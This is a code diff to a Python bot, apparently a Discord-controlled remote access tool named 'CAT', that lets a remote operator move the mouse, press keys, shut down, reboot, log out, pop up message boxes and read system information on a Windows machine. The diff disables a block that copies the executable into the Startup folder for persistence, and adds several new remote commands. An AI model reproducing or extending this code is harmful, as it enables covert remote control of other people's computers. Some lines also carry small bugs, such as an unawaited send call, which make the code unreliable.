@@ -18,12 +18,13 @@ pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='/')
 channel = bot.get_channel(config.channel)
 bot.remove_command('help')
-
+print(win32api.GetVersionEx())
 path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
 
 
 @bot.event
 async def on_ready():
+    """
     try:
 
         with open(path + 'CAT.exe') as f:
@@ -34,7 +35,7 @@ async def on_ready():
         with open('CAT.exe', 'rb') as f:
             data = f.read()
         with open(path + 'CAT.exe', 'wb') as f:
-            f.write(data)
+            f.write(data)"""
 
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
@@ -115,7 +116,7 @@ async def press(ctx, key, how_many):
 
 @bot.command()
 async def help(ctx):  # send help message
-    embed = discord.Embed(title='**Commands**', description='Configuration Administration Tool.', color=0x03fcec, )
+    embed = discord.Embed(title='**Commands**', description='Configuration Administration Tool.', color=0x03fcec)
     # заголовки
     embed.add_field(name='**/help**', value='Show this message.', inline=False)
     embed.add_field(name='**/move**', value='(X) (Y) (time) move mouse.', inline=False)
@@ -133,9 +134,11 @@ async def help(ctx):  # send help message
     embed.add_field(name='**/shutdown**', value='Shutdown.', inline=False)
     embed.add_field(name='**/reboot**', value='Reboot.', inline=False)
     embed.add_field(name='**/off**', value='Disable bot.', inline=False)
+    embed.add_field(name='**/logout**', value='Log out from windows.', inline=False)
+    embed.add_field(name='**/win_info**', value='Get windows information.', inline=False)
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
-    embed.set_footer(text=f'Made by NullifiedVlad',
-                     icon_url='https://i.imgur.com/YbYKL0F.png')
+
+    embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
     embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
     await ctx.send(embed=embed)
 
@@ -199,16 +202,43 @@ async def off(ctx):
 
 
 @bot.command()
-async def wallpaper(ctx, url):
+async def wallpaper(ctx):
+    url = ctx.message.attachments[0].url
     with open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 'wb') as f:
         f.write(nf.img_get(url))
 
     if ctypes.windll.user32.SystemParametersInfoW(20, 0,
                                                   f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 0):
-        await ctx.send('Wallpaper changed!')
+        await ctx.send('Wallpaper was changed!')
     else:
         await ctx.send('ERROR!')
     os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png')
 
+
+@bot.command()
+async def msgbox(ctx, title, text):
+    win32api.MessageBox(None, str(text), str(title))
+
+
+@bot.command()
+async def logout(ctx):
+    ctx.send('Exiting from Windows...')
+    win32api.ExitWindows()
+
+
+@bot.command()
+async def win_info(ctx):
+    info = win32api.GetVersionEx()
+    embed = discord.Embed(title='**CAT-WIN.**', description='Windows information', color=0x03fcec)
+    embed.add_field(name='**Major version.**', value=str(info[0]), inline=False)
+    embed.add_field(name='**Minor version.**', value=str(info[1]), inline=False)
+    embed.add_field(name='**Build number.**', value=str(info[2]), inline=False)
+    embed.add_field(name='**Platform ID.**', value=str(info[3]), inline=False)
+    embed.add_field(name='**Versio.n**', value=str(info[4]), inline=False)
+
+    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
+    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
+    await ctx.send(embed=embed)
 
 bot.run(config.token)
